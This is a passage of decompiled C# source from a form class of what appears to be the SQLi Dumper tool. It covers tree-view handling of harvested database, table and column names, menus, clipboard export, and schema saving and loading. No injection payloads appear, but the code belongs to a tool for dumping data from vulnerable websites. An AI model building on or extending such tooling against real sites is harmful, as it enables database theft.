			foreach (object obj2 in this.trwSchema.Nodes)
			{
				TreeNode treeNode = (TreeNode)obj2;
				if (Operators.CompareString(this.method_41(treeNode.Text), this.method_41(string_9), false) == 0)
				{
					try
					{
						foreach (object obj3 in treeNode.Nodes)
						{
							TreeNode treeNode2 = (TreeNode)obj3;
							if (Operators.CompareString(this.method_41(treeNode2.Text), this.method_41(string_10), false) == 0)
							{
								return treeNode2;
							}
						}
					}
					finally
					{
						IEnumerator enumerator3;
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
					}
				}
			}
			goto IL_0284;
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
		IL_0151:
		try
		{
			foreach (object obj4 in this.trwSchema.Nodes)
			{
				TreeNode treeNode = (TreeNode)obj4;
				if (Operators.CompareString(this.method_41(treeNode.Text), this.method_41(string_9), false) == 0)
				{
					try
					{
						foreach (object obj5 in treeNode.Nodes)
						{
							TreeNode treeNode3 = (TreeNode)obj5;
							if (Operators.CompareString(this.method_41(treeNode3.Text), this.method_41(string_10), false) == 0)
							{
								try
								{
									foreach (object obj6 in treeNode3.Nodes)
									{
										TreeNode treeNode4 = (TreeNode)obj6;
										if (Operators.CompareString(this.method_41(treeNode4.Text), this.method_41(string_11), false) == 0)
										{
											return treeNode4;
										}
									}
								}
								finally
								{
									IEnumerator enumerator6;
									if (enumerator6 is IDisposable)
									{
										(enumerator6 as IDisposable).Dispose();
									}
								}
							}
						}
					}
					finally
					{
						IEnumerator enumerator5;
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
					}
				}
			}
		}
		finally
		{
			IEnumerator enumerator4;
			if (enumerator4 is IDisposable)
			{
				(enumerator4 as IDisposable).Dispose();
			}
		}
		IL_0284:
		return new TreeNode();
	}

	// Token: 0x0600069C RID: 1692 RVA: 0x0002CDE0 File Offset: 0x0002AFE0
	private bool method_53(string string_9)
	{
		foreach (char c in string_9.ToCharArray())
		{
			if (!"abcdefghijklmnopqrstuvwxyz0123456789_-".Contains(c.ToString().ToLower()))
			{
				return false;
			}
		}
		return true;
	}

	// Token: 0x0600069D RID: 1693 RVA: 0x0002CE2C File Offset: 0x0002B02C
	private bool method_54(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		TreeNode treeNode = this.method_52(schema_0, this.method_41(string_9), this.method_41(string_10), string_11);
		return treeNode != null && !string.IsNullOrEmpty(treeNode.Text);
	}

	// Token: 0x0600069E RID: 1694 RVA: 0x0002CE6C File Offset: 0x0002B06C
	private void method_55(object sender, TreeViewEventArgs e)
	{
		if (e.Action == TreeViewAction.ByMouse)
		{
			this.trwSchema.SelectedNode = e.Node;
		}
	}

	// Token: 0x0600069F RID: 1695 RVA: 0x0002CE8C File Offset: 0x0002B08C
	private void method_56(object sender, TreeViewEventArgs e)
	{
		checked
		{
			try
			{
				global::Globals.LockWindowUpdate(this.tpSchema.Handle);
				this.btnTables.Visible = false;
				this.btnColumns.Visible = false;
				this.btnDumpData.Visible = false;
				this.btnColumnUp.Visible = false;
				this.btnColumnDown.Visible = false;
				if (this.trwSchema.SelectedNode != null)
				{
					TreeNode selectedNode = this.trwSchema.SelectedNode;
					int level = selectedNode.Level;
					if (level <= 1)
					{
						selectedNode.Expand();
					}
					try
					{
						foreach (object obj in this.trwSchema.Nodes)
						{
							TreeNode treeNode = (TreeNode)obj;
							if (treeNode.Nodes.Count > 0)
							{
								treeNode.ToolTipText = global::Globals.translate_0.GetStr(this, 41, "") + Conversions.ToString(treeNode.Nodes.Count);
							}
							this.TreeNode_RemoveCheckBox(treeNode, 0);
							try
							{
								foreach (object obj2 in treeNode.Nodes)
								{
									TreeNode treeNode2 = (TreeNode)obj2;
									this.TreeNode_RemoveCheckBox(treeNode2, 0);
									int num = 0;
									try
									{
										foreach (object obj3 in treeNode2.Nodes)
										{
											TreeNode treeNode3 = (TreeNode)obj3;
											if (treeNode3.Checked)
											{
												num++;
											}
										}
									}
									finally
									{
										IEnumerator enumerator3;
										if (enumerator3 is IDisposable)
										{
											(enumerator3 as IDisposable).Dispose();
										}
									}
									if (treeNode2.Nodes.Count > 0)
									{
										treeNode2.ToolTipText = global::Globals.translate_0.GetStr(this, 42, "") + Conversions.ToString(treeNode2.Nodes.Count) + "/" + Conversions.ToString(num);
									}
								}
							}
							finally
							{
								IEnumerator enumerator2;
								if (enumerator2 is IDisposable)
								{
									(enumerator2 as IDisposable).Dispose();
								}
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					switch (level)
					{
					case 0:
						this.btnTables.Visible = true;
						break;
					case 1:
						this.btnColumns.Visible = true;
						break;
					case 2:
					case 3:
						this.btnDumpData.Visible = true;
						if (level == 2)
						{
							this.btnColumnUp.Visible = true;
							this.btnColumnDown.Visible = true;
						}
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
			}
			finally
			{
				global::Globals.LockWindowUpdate(IntPtr.Zero);
			}
		}
	}

	// Token: 0x060006A0 RID: 1696 RVA: 0x0002D198 File Offset: 0x0002B398
	private void method_57(object sender, KeyEventArgs e)
	{
		if (this.trwSchema.SelectedNode != null && ((e.KeyCode == Keys.Delete) & (this.trwSchema.SelectedNode != null)))
		{
			TreeNode selectedNode = this.trwSchema.SelectedNode;
			switch (selectedNode.Level)
			{
			case 0:
				this.method_68(this.mnuRemDB, null);
				break;
			case 1:
				this.method_68(this.mnuRemTable, null);
				break;
			case 2:
				this.method_68(this.mnuRemColumn, null);
				break;
			}
		}
	}

	// Token: 0x060006A1 RID: 1697
	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SendMessage(IntPtr hwnd, int msg, IntPtr wParam, ref Dumper.TVITEM lParam);

	// Token: 0x060006A2 RID: 1698 RVA: 0x0002D224 File Offset: 0x0002B424
	public void TreeNode_RemoveCheckBox(TreeNode node, int index)
	{
		if (node != null)
		{
			Dumper.TVITEM tvitem = default(Dumper.TVITEM);
			tvitem.hItem = node.Handle;
			tvitem.mask = 8;
			tvitem.stateMask = 61440;
			tvitem.state = index << 12;
			Dumper.SendMessage(node.TreeView.Handle, 4415, IntPtr.Zero, ref tvitem);
		}
	}

	// Token: 0x060006A3 RID: 1699 RVA: 0x0002D288 File Offset: 0x0002B488
	internal void method_58()
	{
		new List<string>();
		try
		{
			foreach (object obj in this.trwSchema.Nodes)
			{
				TreeNode treeNode = (TreeNode)obj;
				if (treeNode.Nodes.Count > 0)
				{
					treeNode.ToolTipText = global::Globals.translate_0.GetStr(this, 43, "") + Conversions.ToString(treeNode.Nodes.Count);
				}
				this.TreeNode_RemoveCheckBox(treeNode, 0);
				try
				{
					foreach (object obj2 in treeNode.Nodes)
					{
						TreeNode treeNode2 = (TreeNode)obj2;
						if (treeNode2.Nodes.Count > 0)
						{
							treeNode2.ToolTipText = global::Globals.translate_0.GetStr(this, 44, "") + Conversions.ToString(treeNode2.Nodes.Count);
						}
						this.TreeNode_RemoveCheckBox(treeNode2, 0);
						try
						{
							foreach (object obj3 in treeNode2.Nodes)
							{
								TreeNode treeNode3 = (TreeNode)obj3;
								try
								{
									foreach (object obj4 in treeNode3.Nodes)
									{
										TreeNode treeNode4 = (TreeNode)obj4;
										this.TreeNode_RemoveCheckBox(treeNode4, 0);
									}
								}
								finally
								{
									IEnumerator enumerator4;
									if (enumerator4 is IDisposable)
									{
										(enumerator4 as IDisposable).Dispose();
									}
								}
							}
						}
						finally
						{
							IEnumerator enumerator3;
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
			goto IL_01FB;
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		IL_0197:
		int num;
		if (this.method_59(this.trwSchema.Nodes[num].Text) & (this.trwSchema.Nodes[num].Nodes.Count == 0))
		{
			this.trwSchema.Nodes[num].Remove();
			goto IL_01FB;
		}
		checked
		{
			num++;
		}
		IL_01DC:
		int num2;
		checked
		{
			if (num > num2)
			{
				for (;;)
				{
					IL_0258:
					int num3 = this.trwSchema.Nodes.Count - 1;
					for (int i = 0; i <= num3; i++)
					{
						if (this.method_59(this.trwSchema.Nodes[i].Text))
						{
							this.trwSchema.Nodes[i].Remove();
							goto IL_0258;
						}
					}
					break;
				}
				return;
			}
			goto IL_0197;
		}
		IL_01FB:
		num2 = checked(this.trwSchema.Nodes.Count - 1);
		num = 0;
		goto IL_01DC;
	}

	// Token: 0x060006A4 RID: 1700 RVA: 0x0002D56C File Offset: 0x0002B76C
	private bool method_59(string string_9)
	{
		checked
		{
			int num;
			try
			{
				foreach (object obj in this.trwSchema.Nodes)
				{
					TreeNode treeNode = (TreeNode)obj;
					if (this.method_41(treeNode.Text).Equals(this.method_41(string_9)))
					{
						num++;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return num > 1;
		}
	}

	// Token: 0x060006A5 RID: 1701 RVA: 0x0002D5EC File Offset: 0x0002B7EC
	private void method_60(object sender, EventArgs e)
	{
		bool flag;
		if ((flag = true) == (sender == this.mnuCountDBs))
		{
			this.enum4_0 = Dumper.Enum4.const_0;
		}
		else if (flag == (sender == this.mnuCountTables))
		{
			this.enum4_0 = Dumper.Enum4.const_1;
		}
		else if (flag == (sender == this.mnuCountTablesAll))
		{
			this.enum4_0 = Dumper.Enum4.const_2;
		}
		else if (flag == (sender == this.mnuCountColumns))
		{
			this.enum4_0 = Dumper.Enum4.const_3;
		}
		else if (flag == (sender == this.mnuCountColumnsAll))
		{
			this.enum4_0 = Dumper.Enum4.const_4;
		}
		else if (flag == (sender == this.mnuCountRows))
		{
			this.enum4_0 = Dumper.Enum4.const_5;
		}
		else if (flag == (sender == this.mnuCountRowsAll))
		{
			this.enum4_0 = Dumper.Enum4.const_6;
		}
		this.method_0(Dumper.Enum5.const_6);
	}

	// Token: 0x060006A6 RID: 1702 RVA: 0x0002D6A4 File Offset: 0x0002B8A4
	private void method_61(object sender, CancelEventArgs e)
	{
		bool flag;
		if ((flag = true) == (this.trwSchema.Nodes.Count == 0) || flag == (this.trwSchema.SelectedNode == null))
		{
			this.mnuCountTables.Visible = false;
			this.mnuCountTablesAll.Visible = false;
			this.mnuCountColumns.Visible = false;
			this.mnuCountColumnsAll.Visible = false;
			this.mnuCountRows.Visible = false;
			this.mnuCountRowsAll.Visible = false;
			this.mnuCountSP.Visible = false;
			this.mnuCopyDB.Visible = false;
			this.mnuCopyTable.Visible = false;
			this.mnuUnCheckAllColumns.Visible = false;
			this.mnuCheckAllColumns.Visible = false;
			this.mnuCheckRevert.Visible = false;
			this.mnuCheckAllSP.Visible = false;
			this.mnuCopyColumn.Visible = false;
			this.mnuTreeSP1.Visible = false;
			this.mnuCopyAllNodes.Visible = false;
			this.mnuCopyAllSchema.Visible = false;
			this.mnuTreeSP2.Visible = false;
			this.mnuClearNodes.Visible = false;
			this.mnuClearSchema.Visible = false;
			this.mnuTreeSP3.Visible = false;
			this.mnuRemDB.Visible = false;
			this.mnuRemTable.Visible = false;
			this.mnuRemColumn.Visible = false;
			this.mnuTreeSP4.Visible = false;
			this.mnuAddDB.Visible = true;
			this.mnuAddTable.Visible = false;
			this.mnuAddColumn.Visible = false;
			this.mnuTreeSP5.Visible = false;
			this.mnuCollapseTree.Visible = false;
			this.mnuSortTree.Visible = false;
		}
		else if (flag == (this.trwSchema.SelectedNode != null))
		{
			TreeNode selectedNode = this.trwSchema.SelectedNode;
			this.mnuCountDBs.Visible = true;
			this.mnuCountTables.Visible = selectedNode.Level == 0;
			this.mnuCountTablesAll.Visible = selectedNode.Level == 0;
			this.mnuCountColumns.Visible = selectedNode.Level == 1;
			this.mnuCountColumnsAll.Visible = selectedNode.Level == 1;
			this.mnuCountRows.Visible = selectedNode.Level == 1;
			this.mnuCountRowsAll.Visible = selectedNode.Level == 1;
			this.mnuCountSP.Visible = true;
			this.mnuCopyDB.Visible = selectedNode.Level == 0;
			this.mnuCopyTable.Visible = selectedNode.Level == 1;
			bool flag2 = ((selectedNode.Level == 1) & (selectedNode.Nodes.Count > 1)) | (selectedNode.Level == 2 && selectedNode.Parent.Nodes.Count > 1);
			this.mnuUnCheckAllColumns.Visible = flag2;
			this.mnuCheckAllColumns.Visible = flag2;
			this.mnuCheckRevert.Visible = flag2;
			this.mnuCheckAllSP.Visible = flag2;
			this.mnuCopyColumn.Visible = selectedNode.Level == 2;
			this.mnuCopyAllNodes.Visible = selectedNode.Nodes.Count > 0;
			this.mnuCopyAllSchema.Visible = true;
			this.mnuClearNodes.Visible = selectedNode.Nodes.Count > 0;
			this.mnuClearSchema.Visible = true;
			this.mnuRemDB.Visible = selectedNode.Level == 0;
			this.mnuRemTable.Visible = selectedNode.Level == 1;
			this.mnuRemColumn.Visible = selectedNode.Level == 2;
			this.mnuAddDB.Visible = selectedNode.Level == 0;
			this.mnuAddTable.Visible = selectedNode.Level == 0;
			this.mnuAddColumn.Visible = (selectedNode.Level >= 1) & (selectedNode.Level != 3);
			this.mnuCollapseTree.Visible = true;
			this.mnuSortTree.Visible = true;
			Application.DoEvents();
			this.mnuTreeSP1.Visible = selectedNode.Level != 3;
			this.mnuTreeSP2.Visible = (selectedNode.Nodes.Count > 0) | (selectedNode.Level != 3);
			this.mnuTreeSP3.Visible = (selectedNode.Nodes.Count > 0) | (selectedNode.Level != 3);
			this.mnuTreeSP4.Visible = selectedNode.Level != 3;
			this.mnuTreeSP5.Visible = true;
		}
		else
		{
			this.mnuCountDBs.Visible = true;
			this.mnuCountSP.Visible = true;
		}
	}

	// Token: 0x060006A7 RID: 1703 RVA: 0x0002DB44 File Offset: 0x0002BD44
	private void method_62(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			if (selectedNode.Level == 1)
			{
				try
				{
					foreach (object obj in selectedNode.Nodes)
					{
						TreeNode treeNode = (TreeNode)obj;
						if (sender == this.mnuCheckRevert)
						{
							treeNode.Checked = !treeNode.Checked;
						}
						else
						{
							treeNode.Checked = sender == this.mnuCheckAllColumns;
						}
					}
					return;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (selectedNode.Level == 2)
			{
				try
				{
					foreach (object obj2 in selectedNode.Parent.Nodes)
					{
						TreeNode treeNode2 = (TreeNode)obj2;
						if (sender == this.mnuCheckRevert)
						{
							treeNode2.Checked = !treeNode2.Checked;
						}
						else
						{
							treeNode2.Checked = sender == this.mnuCheckAllColumns;
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
		}
	}

	// Token: 0x060006A8 RID: 1704 RVA: 0x0002DC6C File Offset: 0x0002BE6C
	private void method_63(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				Clipboard.SetText(this.method_41(selectedNode.Text));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x060006A9 RID: 1705 RVA: 0x0002DCD4 File Offset: 0x0002BED4
	private void method_64(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.AppendLine(selectedNode.Text);
				try
				{
					foreach (object obj in selectedNode.Nodes)
					{
						TreeNode treeNode = (TreeNode)obj;
						stringBuilder.AppendLine("\t" + this.method_41(treeNode.Text));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				Clipboard.SetText(stringBuilder.ToString());
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x060006AA RID: 1706 RVA: 0x0002DDB0 File Offset: 0x0002BFB0
	private void method_65(object sender, EventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				foreach (object obj in this.trwSchema.Nodes)
				{
					TreeNode treeNode = (TreeNode)obj;
					stringBuilder.AppendLine(this.method_41(treeNode.Text));
					try
					{
						foreach (object obj2 in treeNode.Nodes)
						{
							TreeNode treeNode2 = (TreeNode)obj2;
							stringBuilder.AppendLine("\t" + this.method_41(treeNode2.Text));
							try
							{
								foreach (object obj3 in treeNode2.Nodes)
								{
									TreeNode treeNode3 = (TreeNode)obj3;
									stringBuilder.AppendLine("\t\t" + this.method_41(treeNode2.Text));
								}
							}
							finally
							{
								IEnumerator enumerator3;
								if (enumerator3 is IDisposable)
								{
									(enumerator3 as IDisposable).Dispose();
								}
							}
						}
					}
					finally
					{
						IEnumerator enumerator2;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	// Token: 0x060006AB RID: 1707 RVA: 0x0002DF6C File Offset: 0x0002C16C
	private void method_66(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				selectedNode.Nodes.Clear();
				selectedNode.ToolTipText = "";
				this.method_56(null, null);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x060006AC RID: 1708 RVA: 0x0002DFE0 File Offset: 0x0002C1E0
	internal void method_67(object sender, EventArgs e)
	{
		this.trwSchema.Nodes.Clear();
		this.lblCountBDs.Text = "-1";
		this.method_56(null, null);
	}

	// Token: 0x060006AD RID: 1709 RVA: 0x0002E00C File Offset: 0x0002C20C
	private void method_68(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				selectedNode.Remove();
				this.method_56(null, null);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x060006AE RID: 1710 RVA: 0x0002E070 File Offset: 0x0002C270
	private void method_69(object sender, EventArgs e)
	{
		TreeNode selectedNode = this.trwSchema.SelectedNode;
		if ((selectedNode != null) | (sender == this.mnuAddDB))
		{
			try
			{
				bool flag;
				if ((flag = true) == (sender == this.mnuAddDB))
				{
					global::Globals.translate_0.GetStr(this, 45, "");
				}
				else if (flag == (sender == this.mnuAddTable))
				{
					global::Globals.translate_0.GetStr(this, 46, "");
				}
				else if (flag == (sender == this.mnuAddColumn))
				{
					global::Globals.translate_0.GetStr(this, 47, "");
				}
				string text;
				using (ImpBox impBox = new ImpBox())
				{
					impBox.Text = Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null));
					impBox.ShowDialog(this);
					if (impBox.DialogResult == DialogResult.OK)
					{
						text = impBox.txtValue.Text.Trim();
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					if (!this.method_53(text))
					{
						using (new Class8(global::Globals.GMain))
						{
							MessageBox.Show("'" + text + "' " + global::Globals.translate_0.GetStr(this, 49, ""), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
							goto IL_0364;
						}
					}
					bool flag2;
					if ((flag2 = true) == (sender == this.mnuAddDB))
					{
						if (this.method_54(Schema.DATABASES, text, "", ""))
						{
							using (new Class8(global::Globals.GMain))
							{
								MessageBox.Show("'" + text + "' " + global::Globals.translate_0.GetStr(this, 50, ""), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
								goto IL_035C;
							}
						}
						this.method_47(text);
					}
					else if (flag2 == (sender == this.mnuAddTable))
					{
						string text2 = selectedNode.FullPath.Split(new char[] { '\\' })[0];
						if (this.method_54(Schema.TABLES, text2, text, ""))
						{
							using (new Class8(global::Globals.GMain))
							{
								MessageBox.Show("'" + text + "' " + global::Globals.translate_0.GetStr(this, 51, ""), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
								goto IL_035C;
							}
						}
						this.method_48(text2, text);
					}
					else if (flag2 == (sender == this.mnuAddColumn))
					{
						string text3 = selectedNode.FullPath.Split(new char[] { '\\' })[0];
						string text4 = selectedNode.FullPath.Split(new char[] { '\\' })[1];
						if (this.method_54(Schema.COLUMNS, text3, text4, text))
						{
							using (new Class8(global::Globals.GMain))
							{
								MessageBox.Show("'" + text + "' " + global::Globals.translate_0.GetStr(this, 52, ""), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
								goto IL_035C;
							}
						}
						this.method_49(text3, text4, text);
					}
					IL_035C:
					this.method_56(null, null);
				}
				IL_0364:;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x060006AF RID: 1711 RVA: 0x0002E49C File Offset: 0x0002C69C
	private void method_70(object sender, EventArgs e)
	{
		try
		{
			try
			{
				foreach (object obj in this.trwSchema.Nodes)
				{
					TreeNode treeNode = (TreeNode)obj;
					treeNode.Collapse(false);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	// Token: 0x060006B0 RID: 1712 RVA: 0x0002E530 File Offset: 0x0002C730
	private void method_71(object sender, EventArgs e)
	{
		try
		{
			global::Globals.LockWindowUpdate(this.trwSchema.Handle);
			this.method_72(this.trwSchema);
			this.method_58();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		finally
		{
			global::Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	// Token: 0x060006B1 RID: 1713 RVA: 0x0002E5B0 File Offset: 0x0002C7B0
	private void method_72(TreeViewExt treeViewExt_0)
	{
		this.method_73(treeViewExt_0.Nodes);
		try
		{
			foreach (object obj in treeViewExt_0.Nodes)
			{
				TreeNode treeNode = (TreeNode)obj;
				this.method_73(treeNode.Nodes);
				try
				{
					foreach (object obj2 in treeNode.Nodes)
					{
						TreeNode treeNode2 = (TreeNode)obj2;
						this.method_73(treeNode2.Nodes);
						try
						{
							foreach (object obj3 in treeNode2.Nodes)
							{
								TreeNode treeNode3 = (TreeNode)obj3;
								this.method_73(treeNode3.Nodes);
							}
						}
						finally
						{
							IEnumerator enumerator3;
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x060006B2 RID: 1714 RVA: 0x0002E6CC File Offset: 0x0002C8CC
	private void method_73(TreeNodeCollection treeNodeCollection_0)
	{
		TreeNode[] array = new TreeNode[checked(treeNodeCollection_0.Count - 1 + 1)];
		treeNodeCollection_0.CopyTo(array, 0);
		Array.Sort<TreeNode>(array, new Dumper.TreeNodeComparer());
		treeNodeCollection_0.Clear();
		treeNodeCollection_0.AddRange(array);
	}

	// Token: 0x17000243 RID: 579
	// (get) Token: 0x060006B3 RID: 1715 RVA: 0x0002E70C File Offset: 0x0002C90C
	// (set) Token: 0x060006B4 RID: 1716 RVA: 0x0002E714 File Offset: 0x0002C914
	internal virtual ToolStripSpringTextBox txtURL
	{
		[CompilerGenerated]
		get
		{
			return this.toolStripSpringTextBox_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_98);
			ToolStripSpringTextBox toolStripSpringTextBox = this.toolStripSpringTextBox_0;
			if (toolStripSpringTextBox != null)
			{
				toolStripSpringTextBox.TextChanged -= eventHandler;
			}
			this.toolStripSpringTextBox_0 = value;
			toolStripSpringTextBox = this.toolStripSpringTextBox_0;
			if (toolStripSpringTextBox != null)
			{
				toolStripSpringTextBox.TextChanged += eventHandler;
			}
		}
	}

	// Token: 0x060006B5 RID: 1717 RVA: 0x0002E758 File Offset: 0x0002C958
	private void Dumper_Load(object sender, EventArgs e)
	{
		this.splData.BringToFront();
		this.string_2 = global::Globals.translate_0.GetStr(this, 3, "");
		this.string_3 = global::Globals.translate_0.GetStr(this, 4, "");
		this.string_4 = global::Globals.translate_0.GetStr(this, 5, "");
		this.mnuAutoScroll.Text = global::Globals.translate_0.GetStr(global::Globals.GMain, 62, "");
		this.btnSearchColumn.Text = global::Globals.GMain.btnSearchColumnStart.Text;
		this.chkSearchColumnAllDBs.Text = global::Globals.GMain.chkSearchColumnAllDBs.Text;
		this.tpSearch.Text = global::Globals.GMain.btnSQLiSearch.Text;
	}

	// Token: 0x060006B6 RID: 1718 RVA: 0x0002E824 File Offset: 0x0002CA24
	internal void method_74()
	{
		this.method_81(Class50.Class51_0);
	}

	// Token: 0x060006B7 RID: 1719 RVA: 0x0002E834 File Offset: 0x0002CA34
	internal void method_75()
	{
		this.method_80(Class50.Class51_0);
	}

	// Token: 0x060006B8 RID: 1720 RVA: 0x0002E844 File Offset: 0x0002CA44
	internal void method_76()
	{
		global::Globals.GMain.pnlSQLiDumper.SuspendLayout();
		global::Globals.LockWindowUpdateForced(false);
		global::Globals.GMain.method_63(true);
		global::Globals.GMain.method_60(true);
		global::Globals.LockWindowUpdateForced(true);
		global::Globals.GMain.pnlSQLiDumper.ResumeLayout();
		global::Globals.GMain.pnlSQLiDumper.Refresh();
	}

	// Token: 0x060006B9 RID: 1721 RVA: 0x0002E8A4 File Offset: 0x0002CAA4
	internal void method_77()
	{
		try
		{
			this.tscSchemas.Items.Clear();
			foreach (string text in Directory.GetFiles(global::Globals.SCHEMA_PATH, "*.xml"))
			{
				FileInfo fileInfo = new FileInfo(text);
				this.tscSchemas.Items.Add(fileInfo.Name);
			}
		}
		catch (Exception ex)
		{
			this.UpDateStatus(ex.ToString(), false);
		}
	}

	// Token: 0x060006BA RID: 1722 RVA: 0x0002E934 File Offset: 0x0002CB34
	internal void method_78(string string_9)
	{
		try
		{
			if (File.Exists(global::Globals.SCHEMA_PATH + string_9))
			{
				if (string_9.Equals("AppInstencie.Schema"))
				{
					return;
				}
				using (new Class8(global::Globals.GMain))
				{
					if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 53, "") + "\r\n" + global::Globals.translate_0.GetStr(this, 54, ""), global::Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
					{
						return;
					}
				}
			}
			Class51 class2 = new Class51(global::Globals.SCHEMA_PATH + string_9, "SQLi_Dumper", ';', 0);
			this.method_81(class2);
			class2.method_9(true, true);
			if (!string_9.Equals("AppInstencie.Schema"))
			{
				this.method_77();
				this.UpDateStatus(global::Globals.translate_0.GetStr(this, 55, "") + " (" + string_9 + ")", false);
				this.tscSchemas.Text = string_9;
			}
		}
		catch (Exception ex)
		{
			this.UpDateStatus(ex.ToString(), false);
		}
	}

	// Token: 0x060006BB RID: 1723 RVA: 0x0002EA78 File Offset: 0x0002CC78
	internal void method_79(string string_9)
	{
		try
		{
			if (File.Exists(global::Globals.SCHEMA_PATH + string_9))
			{
				Class51 @class = new Class51(global::Globals.SCHEMA_PATH + string_9, "SQLi_Dumper", ';', 0);
				this.method_80(@class);
				if (string_9.Equals("AppInstencie.Schema"))
				{
					File.Delete(global::Globals.SCHEMA_PATH + string_9);
				}
				else
				{
					this.UpDateStatus(global::Globals.translate_0.GetStr(this, 56, "") + " (" + string_9 + ")", false);
				}
			}
		}
		catch (Exception ex)
		{
			this.UpDateStatus(ex.ToString(), false);
		}
	}

	// Token: 0x060006BC RID: 1724 RVA: 0x0002EB30 File Offset: 0x0002CD30
	private void method_80(Class51 class51_0)
	{
		Class50.smethod_2(this, class51_0);
		this.txtURL.Text = Class50.smethod_5(base.Name, this.txtURL.Name, "", class51_0);
		this.cmbSqlType.SelectedItem = Class50.smethod_5(base.Name, this.cmbSqlType.Name, Class54.smethod_5(Types.MySQL_No_Error), class51_0);
		this.lblVersion.Text = Class50.smethod_5(base.Name, this.lblVersion.Name, "", class51_0);
		this.lblCountry.Text = Class50.smethod_5(base.Name, this.lblCountry.Name, "", class51_0);
